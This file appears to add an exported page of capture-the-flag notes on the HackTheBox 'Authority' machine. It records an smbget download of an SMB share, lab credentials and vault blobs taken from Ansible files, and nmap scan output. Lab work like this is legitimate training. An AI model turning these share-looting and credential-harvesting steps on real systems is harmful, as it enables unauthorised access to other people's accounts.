@@ -1,0 +1,1103 @@
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=utf-8"/><title>Authority</title><style>
+/* cspell:disable-file */
+/* webkit printing magic: print all background colors */
+html {
+	-webkit-print-color-adjust: exact;
+}
+* {
+	box-sizing: border-box;
+	-webkit-print-color-adjust: exact;
+}
+
+html,
+body {
+	margin: 0;
+	padding: 0;
+}
+@media only screen {
+	body {
+		margin: 2em auto;
+		max-width: 900px;
+		color: rgb(55, 53, 47);
+	}
+}
+
+body {
+	line-height: 1.5;
+	white-space: pre-wrap;
+}
+
+a,
+a.visited {
+	color: inherit;
+	text-decoration: underline;
+}
+
+.pdf-relative-link-path {
+	font-size: 80%;
+	color: #444;
+}
+
+h1,
+h2,
+h3 {
+	letter-spacing: -0.01em;
+	line-height: 1.2;
+	font-weight: 600;
+	margin-bottom: 0;
+}
+
+.page-title {
+	font-size: 2.5rem;
+	font-weight: 700;
+	margin-top: 0;
+	margin-bottom: 0.75em;
+}
+
+h1 {
+	font-size: 1.875rem;
+	margin-top: 1.875rem;
+}
+
+h2 {
+	font-size: 1.5rem;
+	margin-top: 1.5rem;
+}
+
+h3 {
+	font-size: 1.25rem;
+	margin-top: 1.25rem;
+}
+
+.source {
+	border: 1px solid #ddd;
+	border-radius: 3px;
+	padding: 1.5em;
+	word-break: break-all;
+}
+
+.callout {
+	border-radius: 3px;
+	padding: 1rem;
+}
+
+figure {
+	margin: 1.25em 0;
+	page-break-inside: avoid;
+}
+
+figcaption {
+	opacity: 0.5;
+	font-size: 85%;
+	margin-top: 0.5em;
+}
+
+mark {
+	background-color: transparent;
+}
+
+.indented {
+	padding-left: 1.5em;
+}
+
+hr {
+	background: transparent;
+	display: block;
+	width: 100%;
+	height: 1px;
+	visibility: visible;
+	border: none;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.09);
+}
+
+img {
+	max-width: 100%;
+}
+
+@media only print {
+	img {
+		max-height: 100vh;
+		object-fit: contain;
+	}
+}
+
+@page {
+	margin: 1in;
+}
+
+.collection-content {
+	font-size: 0.875rem;
+}
+
+.column-list {
+	display: flex;
+	justify-content: space-between;
+}
+
+.column {
+	padding: 0 1em;
+}
+
+.column:first-child {
+	padding-left: 0;
+}
+
+.column:last-child {
+	padding-right: 0;
+}
+
+.table_of_contents-item {
+	display: block;
+	font-size: 0.875rem;
+	line-height: 1.3;
+	padding: 0.125rem;
+}
+
+.table_of_contents-indent-1 {
+	margin-left: 1.5rem;
+}
+
+.table_of_contents-indent-2 {
+	margin-left: 3rem;
+}
+
+.table_of_contents-indent-3 {
+	margin-left: 4.5rem;
+}
+
+.table_of_contents-link {
+	text-decoration: none;
+	opacity: 0.7;
+	border-bottom: 1px solid rgba(55, 53, 47, 0.18);
+}
+
+table,
+th,
+td {
+	border: 1px solid rgba(55, 53, 47, 0.09);
+	border-collapse: collapse;
+}
+
+table {
+	border-left: none;
+	border-right: none;
+}
+
+th,
+td {
+	font-weight: normal;
+	padding: 0.25em 0.5em;
+	line-height: 1.5;
+	min-height: 1.5em;
+	text-align: left;
+}
+
+th {
+	color: rgba(55, 53, 47, 0.6);
+}
+
+ol,
+ul {
+	margin: 0;
+	margin-block-start: 0.6em;
+	margin-block-end: 0.6em;
+}
+
+li > ol:first-child,
+li > ul:first-child {
+	margin-block-start: 0.6em;
+}
+
+ul > li {
+	list-style: disc;
+}
+
+ul.to-do-list {
+	padding-inline-start: 0;
+}
+
+ul.to-do-list > li {
+	list-style: none;
+}
+
+.to-do-children-checked {
+	text-decoration: line-through;
+	opacity: 0.375;
+}
+
+ul.toggle > li {
+	list-style: none;
+}
+
+ul {
+	padding-inline-start: 1.7em;
+}
+
+ul > li {
+	padding-left: 0.1em;
+}
+
+ol {
+	padding-inline-start: 1.6em;
+}
+
+ol > li {
+	padding-left: 0.2em;
+}
+
+.mono ol {
+	padding-inline-start: 2em;
+}
+
+.mono ol > li {
+	text-indent: -0.4em;
+}
+
+.toggle {
+	padding-inline-start: 0em;
+	list-style-type: none;
+}
+
+/* Indent toggle children */
+.toggle > li > details {
+	padding-left: 1.7em;
+}
+
+.toggle > li > details > summary {
+	margin-left: -1.1em;
+}
+
+.selected-value {
+	display: inline-block;
+	padding: 0 0.5em;
+	background: rgba(206, 205, 202, 0.5);
+	border-radius: 3px;
+	margin-right: 0.5em;
+	margin-top: 0.3em;
+	margin-bottom: 0.3em;
+	white-space: nowrap;
+}
+
+.collection-title {
+	display: inline-block;
+	margin-right: 1em;
+}
+
+.page-description {
+    margin-bottom: 2em;
+}
+
+.simple-table {
+	margin-top: 1em;
+	font-size: 0.875rem;
+	empty-cells: show;
+}
+.simple-table td {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table th {
+	height: 29px;
+	min-width: 120px;
+}
+
+.simple-table-header-color {
+	background: rgb(247, 246, 243);
+	color: black;
+}
+.simple-table-header {
+	font-weight: 500;
+}
+
+time {
+	opacity: 0.5;
+}
+
+.icon {
+	display: inline-block;
+	max-width: 1.2em;
+	max-height: 1.2em;
+	text-decoration: none;
+	vertical-align: text-bottom;
+	margin-right: 0.5em;
+}
+
+img.icon {
+	border-radius: 3px;
+}
+
+.user-icon {
+	width: 1.5em;
+	height: 1.5em;
+	border-radius: 100%;
+	margin-right: 0.5rem;
+}
+
+.user-icon-inner {
+	font-size: 0.8em;
+}
+
+.text-icon {
+	border: 1px solid #000;
+	text-align: center;
+}
+
+.page-cover-image {
+	display: block;
+	object-fit: cover;
+	width: 100%;
+	max-height: 30vh;
+}
+
+.page-header-icon {
+	font-size: 3rem;
+	margin-bottom: 1rem;
+}
+
+.page-header-icon-with-cover {
+	margin-top: -0.72em;
+	margin-left: 0.07em;
+}
+
+.page-header-icon img {
+	border-radius: 3px;
+}
+
+.link-to-page {
+	margin: 1em 0;
+	padding: 0;
+	border: none;
+	font-weight: 500;
+}
+
+p > .user {
+	opacity: 0.5;
+}
+
+td > .user,
+td > time {
+	white-space: nowrap;
+}
+
+input[type="checkbox"] {
+	transform: scale(1.5);
+	margin-right: 0.6em;
+	vertical-align: middle;
+}
+
+p {
+	margin-top: 0.5em;
+	margin-bottom: 0.5em;
+}
+
+.image {
+	border: none;
+	margin: 1.5em 0;
+	padding: 0;
+	border-radius: 0;
+	text-align: center;
+}
+
+.code,
+code {
+	background: rgba(135, 131, 120, 0.15);
+	border-radius: 3px;
+	padding: 0.2em 0.4em;
+	border-radius: 3px;
+	font-size: 85%;
+	tab-size: 2;
+}
+
+code {
+	color: #eb5757;
+}
+
+.code {
+	padding: 1.5em 1em;
+}
+
+.code-wrap {
+	white-space: pre-wrap;
+	word-break: break-all;
+}
+
+.code > code {
+	background: none;
+	padding: 0;
+	font-size: 100%;
+	color: inherit;
+}
+
+blockquote {
+	font-size: 1.25em;
+	margin: 1em 0;
+	padding-left: 1em;
+	border-left: 3px solid rgb(55, 53, 47);
+}
+
+.bookmark {
+	text-decoration: none;
+	max-height: 8em;
+	padding: 0;
+	display: flex;
+	width: 100%;
+	align-items: stretch;
+}
+
+.bookmark-title {
+	font-size: 0.85em;
+	overflow: hidden;
+	text-overflow: ellipsis;
+	height: 1.75em;
+	white-space: nowrap;
+}
+
+.bookmark-text {
+	display: flex;
+	flex-direction: column;
+}
+
+.bookmark-info {
+	flex: 4 1 180px;
+	padding: 12px 14px 14px;
+	display: flex;
+	flex-direction: column;
+	justify-content: space-between;
+}
+
+.bookmark-image {
+	width: 33%;
+	flex: 1 1 180px;
+	display: block;
+	position: relative;
+	object-fit: cover;
+	border-radius: 1px;
+}
+
+.bookmark-description {
+	color: rgba(55, 53, 47, 0.6);
+	font-size: 0.75em;
+	overflow: hidden;
+	max-height: 4.5em;
+	word-break: break-word;
+}
+
+.bookmark-href {
+	font-size: 0.75em;
+	margin-top: 0.25em;
+}
+
+.sans { font-family: ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol"; }
+.code { font-family: "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace; }
+.serif { font-family: Lyon-Text, Georgia, ui-serif, serif; }
+.mono { font-family: iawriter-mono, Nitti, Menlo, Courier, monospace; }
+.pdf .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK JP'; }
+.pdf:lang(zh-CN) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK SC'; }
+.pdf:lang(zh-TW) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK TC'; }
+.pdf:lang(ko-KR) .sans { font-family: Inter, ui-sans-serif, -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, "Apple Color Emoji", Arial, sans-serif, "Segoe UI Emoji", "Segoe UI Symbol", 'Twemoji', 'Noto Color Emoji', 'Noto Sans CJK KR'; }
+.pdf .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .code { font-family: Source Code Pro, "SFMono-Regular", Menlo, Consolas, "PT Mono", "Liberation Mono", Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.pdf .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK JP'; }
+.pdf:lang(zh-CN) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK SC'; }
+.pdf:lang(zh-TW) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK TC'; }
+.pdf:lang(ko-KR) .serif { font-family: PT Serif, Lyon-Text, Georgia, ui-serif, serif, 'Twemoji', 'Noto Color Emoji', 'Noto Serif CJK KR'; }
+.pdf .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK JP'; }
+.pdf:lang(zh-CN) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK SC'; }
+.pdf:lang(zh-TW) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK TC'; }
+.pdf:lang(ko-KR) .mono { font-family: PT Mono, iawriter-mono, Nitti, Menlo, Courier, monospace, 'Twemoji', 'Noto Color Emoji', 'Noto Sans Mono CJK KR'; }
+.highlight-default {
+	color: rgba(55, 53, 47, 1);
+}
+.highlight-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.highlight-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.highlight-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.highlight-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.highlight-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.highlight-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.highlight-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.highlight-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.highlight-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.highlight-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.highlight-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.highlight-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.highlight-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.highlight-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.highlight-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.highlight-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.highlight-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.highlight-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.block-color-default {
+	color: inherit;
+	fill: inherit;
+}
+.block-color-gray {
+	color: rgba(120, 119, 116, 1);
+	fill: rgba(120, 119, 116, 1);
+}
+.block-color-brown {
+	color: rgba(159, 107, 83, 1);
+	fill: rgba(159, 107, 83, 1);
+}
+.block-color-orange {
+	color: rgba(217, 115, 13, 1);
+	fill: rgba(217, 115, 13, 1);
+}
+.block-color-yellow {
+	color: rgba(203, 145, 47, 1);
+	fill: rgba(203, 145, 47, 1);
+}
+.block-color-teal {
+	color: rgba(68, 131, 97, 1);
+	fill: rgba(68, 131, 97, 1);
+}
+.block-color-blue {
+	color: rgba(51, 126, 169, 1);
+	fill: rgba(51, 126, 169, 1);
+}
+.block-color-purple {
+	color: rgba(144, 101, 176, 1);
+	fill: rgba(144, 101, 176, 1);
+}
+.block-color-pink {
+	color: rgba(193, 76, 138, 1);
+	fill: rgba(193, 76, 138, 1);
+}
+.block-color-red {
+	color: rgba(212, 76, 71, 1);
+	fill: rgba(212, 76, 71, 1);
+}
+.block-color-gray_background {
+	background: rgba(241, 241, 239, 1);
+}
+.block-color-brown_background {
+	background: rgba(244, 238, 238, 1);
+}
+.block-color-orange_background {
+	background: rgba(251, 236, 221, 1);
+}
+.block-color-yellow_background {
+	background: rgba(251, 243, 219, 1);
+}
+.block-color-teal_background {
+	background: rgba(237, 243, 236, 1);
+}
+.block-color-blue_background {
+	background: rgba(231, 243, 248, 1);
+}
+.block-color-purple_background {
+	background: rgba(244, 240, 247, 0.8);
+}
+.block-color-pink_background {
+	background: rgba(249, 238, 243, 0.8);
+}
+.block-color-red_background {
+	background: rgba(253, 235, 236, 1);
+}
+.select-value-color-uiBlue { background-color: rgba(35, 131, 226, .07); }
+.select-value-color-pink { background-color: rgba(245, 224, 233, 1); }
+.select-value-color-purple { background-color: rgba(232, 222, 238, 1); }
+.select-value-color-green { background-color: rgba(219, 237, 219, 1); }
+.select-value-color-gray { background-color: rgba(227, 226, 224, 1); }
+.select-value-color-translucentGray { background-color: rgba(255, 255, 255, 0.0375); }
+.select-value-color-orange { background-color: rgba(250, 222, 201, 1); }
+.select-value-color-brown { background-color: rgba(238, 224, 218, 1); }
+.select-value-color-red { background-color: rgba(255, 226, 221, 1); }
+.select-value-color-yellow { background-color: rgba(253, 236, 200, 1); }
+.select-value-color-blue { background-color: rgba(211, 229, 239, 1); }
+.select-value-color-pageGlass { background-color: undefined; }
+.select-value-color-washGlass { background-color: undefined; }
+
+.checkbox {
+	display: inline-flex;
+	vertical-align: text-bottom;
+	width: 16;
+	height: 16;
+	background-size: 16px;
+	margin-left: 2px;
+	margin-right: 5px;
+}
+
+.checkbox-on {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20width%3D%2216%22%20height%3D%2216%22%20fill%3D%22%2358A9D7%22%2F%3E%0A%3Cpath%20d%3D%22M6.71429%2012.2852L14%204.9995L12.7143%203.71436L6.71429%209.71378L3.28571%206.2831L2%207.57092L6.71429%2012.2852Z%22%20fill%3D%22white%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+
+.checkbox-off {
+	background-image: url("data:image/svg+xml;charset=UTF-8,%3Csvg%20width%3D%2216%22%20height%3D%2216%22%20viewBox%3D%220%200%2016%2016%22%20fill%3D%22none%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%0A%3Crect%20x%3D%220.75%22%20y%3D%220.75%22%20width%3D%2214.5%22%20height%3D%2214.5%22%20fill%3D%22white%22%20stroke%3D%22%2336352F%22%20stroke-width%3D%221.5%22%2F%3E%0A%3C%2Fsvg%3E");
+}
+	
+</style></head><body><article id="a5ab4bf4-b42f-4aeb-970b-e06ffd7c5d00" class="page sans"><header><div class="page-header-icon undefined"><span class="icon">🧑‍⚖️</span></div><h1 class="page-title">Authority</h1><p class="page-description"></p></header><div class="page-body"><p id="e772eb3f-2e87-4747-8018-dc3b8dcd455a" class="">Loot:</p><p id="e7117918-4461-42dc-9aa7-c870380234f5" class="">yougotgot㉿yougotgot)-[~/Desktop/HTB/Authority]<br/>└─$ cat ansible_inventory<br/>ansible_user: administrator<br/>ansible_password: Welcome1<br/>ansible_port: 5985<br/>ansible_connection: winrm<br/>ansible_winrm_transport: ntlm<br/>ansible_winrm_server_cert_validation: ignore<br/></p><p id="a70da340-a0b5-4f51-94cc-9c455b6376bb" class="">
+</p><p id="9bd2736b-3cce-488d-a226-436fd5f222e1" class="">Getting all the content from smb share Development</p><p id="3ec46f86-1f67-492e-b5d9-862f37f90774" class=""><code>smbget -R smb://10.129.235.253/Development</code></p><p id="44f9a71c-c375-4ccc-adcd-75fbae1b1b3c" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="233c39fa-8b5b-4d20-815a-b4acef87c24a" class="code"><code class="language-Rust">ougotgot㉿yougotgot)-[~/Desktop/HTB/Authority]
+└─$ cat ansible_inventory 
+ansible_user: administrator
+ansible_password: Welcome1
+ansible_port: 5985
+ansible_connection: winrm
+ansible_winrm_transport: ntlm
+ansible_winrm_server_cert_validation: ignore</code></pre><p id="ffb40c1c-8c8e-4d8a-aff3-b9b46f211b46" class="">
+</p><p id="cea4619c-e814-4207-b8f8-691a2fc22a23" class="">Tomcat</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="97b38b8e-48ea-482d-853e-0a114a09be5a" class="code"><code class="language-Rust">┌──(yougotgot㉿yougotgot)-[~/Desktop/HTB/Authority]
+└─$ cat tomcat-users.xml.j2    
+&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;cp1252&#x27;?&gt;
+
+&lt;tomcat-users xmlns=&quot;http://tomcat.apache.org/xml&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;
+ xsi:schemaLocation=&quot;http://tomcat.apache.org/xml tomcat-users.xsd&quot;
+ version=&quot;1.0&quot;&gt;
+
+&lt;user username=&quot;admin&quot; password=&quot;T0mc@tAdm1n&quot; roles=&quot;manager-gui&quot;/&gt;  
+&lt;user username=&quot;robot&quot; password=&quot;T0mc@tR00t&quot; roles=&quot;manager-script&quot;/&gt;
+
+&lt;/tomcat-users&gt;</code></pre><p id="57f3dd0d-723e-4318-9bf7-fd2c5469bd3f" class="">
+</p><p id="b7d47ca9-985c-4dc7-baf3-fe32bb8ff069" class="">Login error:</p><figure id="d8a172de-da61-4db8-b3e2-f2af49c15cd9" class="image"><a href="Authority%20a5ab4bf4b42f4aeb970be06ffd7c5d00/Untitled.png"><img style="width:983px" src="Authority%20a5ab4bf4b42f4aeb970be06ffd7c5d00/Untitled.png"/></a></figure><p id="88be7425-cbd3-45b4-a207-2e5564e5d5b5" class="">
+</p><p id="82cb3720-95ac-404a-a502-467f7d1f8eaa" class="">
+</p><p id="54b7e62d-259e-454b-a963-9bfa839c1db9" class="">
+</p><p id="595faf78-b6ee-4256-9dad-6fc923d50309" class="">Port 8443 PWM</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6ed8b2a0-2c77-494a-9f39-369abb903371" class="code"><code class="language-Rust">8443/tcp open  ssl/https-alt
+|_http-title: Site doesn&#x27;t have a title (text/html;charset=ISO-8859-1).
+| ssl-cert: Subject: commonName=172.16.2.118
+| Not valid before: 2023-07-15T03:09:14
+|_Not valid after:  2025-07-16T14:47:38
+| fingerprint-strings: 
+|   FourOhFourRequest, GetRequest: 
+|     HTTP/1.1 200 
+|     Content-Type: text/html;charset=ISO-8859-1
+|     Content-Length: 82
+|     Date: Mon, 17 Jul 2023 18:54:34 GMT
+|     Connection: close
+|     &lt;html&gt;&lt;head&gt;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;URL=&#x27;/pwm&#x27;&quot;/&gt;&lt;/head&gt;&lt;/html&gt;
+|   HTTPOptions: 
+|     HTTP/1.1 200 
+|     Allow: GET, HEAD, POST, OPTIONS
+|     Content-Length: 0
+|     Date: Mon, 17 Jul 2023 18:54:34 GMT
+|     Connection: close
+|   RTSPRequest: 
+|     HTTP/1.1 400 
+|     Content-Type: text/html;charset=utf-8
+|     Content-Language: en
+|     Content-Length: 1936
+|     Date: Mon, 17 Jul 2023 18:54:39 GMT
+|     Connection: close
+|     &lt;!doctype html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;&lt;title&gt;HTTP Status 400 
+|     Request&lt;/title&gt;&lt;style type=&quot;text/css&quot;&gt;body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;HTTP Status 400 
+|_    Request&lt;/h1&gt;&lt;hr class=&quot;line&quot; /&gt;&lt;p&gt;&lt;b&gt;Type&lt;/b&gt; Exception Report&lt;/p&gt;&lt;p&gt;&lt;b&gt;Message&lt;/b&gt; Invalid character found in the HTTP protocol [RTSP&amp;#47;1.00x0d0x0a0x0d0x0a...]&lt;/p&gt;&lt;p&gt;&lt;b&gt;Description&lt;/b&gt; The server cannot or will not process the request due to something that is perceived to be a client error (e.g., malformed request syntax, invalid
+|_ssl-date: TLS randomness does not represent time
+Service Info: Host: AUTHORITY; OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre><p id="e21d77dc-6b18-406b-9292-fb33750cec35" class="">
+</p><p id="b9915fd4-542b-4a6a-8c4d-c7c44d8c49a0" class="">some internal ip 172.16.2.118 ?</p><p id="f1073b4f-d4d4-449a-81c2-ad9dec8ccbe1" class="">
+</p><p id="55e4ef19-5277-490e-ba73-4daf30140607" class="">CA file</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ea603245-b6ed-4fb7-9fe9-d4f8419fc29a" class="code"><code class="language-Rust">┌──(yougotgot㉿yougotgot)-[~/Desktop/HTB/Authority]
+└─$ cat main.yml    
+---
+# defaults file for ca
+
+# set ca_init: &#x27;yes&#x27; to create CA
+ca_init: yes
+
+# ca_own_root: &#x27;yes&#x27; if you want to have yout own root CA.
+# if no, set ca_certificate_path manually
+ca_own_root: yes
+
+# A passphrase for the CA key.
+ca_passphrase: SuP3rS3creT
+
+# The common name for the CA.
+ca_common_name: authority.htb
+
+# Other details for the CA.
+ca_country_name: NL
+ca_email_address: admin@authority.htb
+ca_organization_name: htb
+ca_organizational_unit_name: htb
+ca_state_or_province_name: Utrecht
+ca_locality_name: Utrecht
+
+# There are two formats to request a key and certificate:
+# 1. With details: (Includes `name:`)
+# ca_requests:
+#   - name: certificate1.example.com
+#     passphrase: S3creT
+#
+# 2. Without details: (Does not include `name:`)
+# ca_requests:
+#   - &quot;{{ ansible_fqdn }}&quot;
+
+# You can also mix these formats:
+# ca_requests:
+#   - name: certificate1.example.com
+#     passphrase: S3creT
+#   - &quot;{{ ansible_fqdn }}&quot;
+
+# Where to publish the certificates, normally a webserver location.
+# If not specified, certificates will not be published.
+# {{ httpd_data_directory }} is inheritted from the role robertdebock.httpd.
+ca_publication_location: &quot;{{ httpd_data_directory | default(&#x27;/tmp&#x27;) }}/pub&quot;
+
+# Where do the certificates need to be stored? By default the distribution
+# preferred locations are used (see `vars/main.yml`, under `_ca_openssl_path`.
+# If you need a CA certificate somewhere else, simple use something like this:
+# ca_openssl_path: /my/preferred/path
+ca_openssl_path: &quot;{{ _ca_openssl_path[ansible_os_family] | default(_ca_openssl_path[&#x27;default&#x27;] ) }}&quot;</code></pre><p id="f60e4d6d-308f-4902-a92f-723160ff0f51" class="">
+</p><p id="207a9a1d-b456-406d-af15-e780405f44b9" class="">Ok, found some hashes lmao</p><p id="16b648c8-b3b3-4301-81e6-db74ac60c52c" class="">
+</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9cbc38bc-ee00-4932-9138-ed785f82ebd5" class="code"><code class="language-Rust">┌──(yougotgot㉿yougotgot)-[~/…/Automation/Ansible/PWM/defaults]
+└─$ cat main.yml           
+---
+pwm_run_dir: &quot;{{ lookup(&#x27;env&#x27;, &#x27;PWD&#x27;) }}&quot;
+
+pwm_hostname: authority.htb.corp
+pwm_http_port: &quot;{{ http_port }}&quot;
+pwm_https_port: &quot;{{ https_port }}&quot;
+pwm_https_enable: true
+
+pwm_require_ssl: false
+
+pwm_admin_login: !vault |
+          $ANSIBLE_VAULT;1.1;AES256
+          32666534386435366537653136663731633138616264323230383566333966346662313161326239
+          6134353663663462373265633832356663356239383039640a346431373431666433343434366139
+          35653634376333666234613466396534343030656165396464323564373334616262613439343033
+          6334326263326364380a653034313733326639323433626130343834663538326439636232306531
+          3438
+
+pwm_admin_password: !vault |
+          $ANSIBLE_VAULT;1.1;AES256
+          31356338343963323063373435363261323563393235633365356134616261666433393263373736
+          3335616263326464633832376261306131303337653964350a363663623132353136346631396662
+          38656432323830393339336231373637303535613636646561653637386634613862316638353530
+          3930356637306461350a316466663037303037653761323565343338653934646533663365363035
+          6531
+
+ldap_uri: ldap://127.0.0.1/
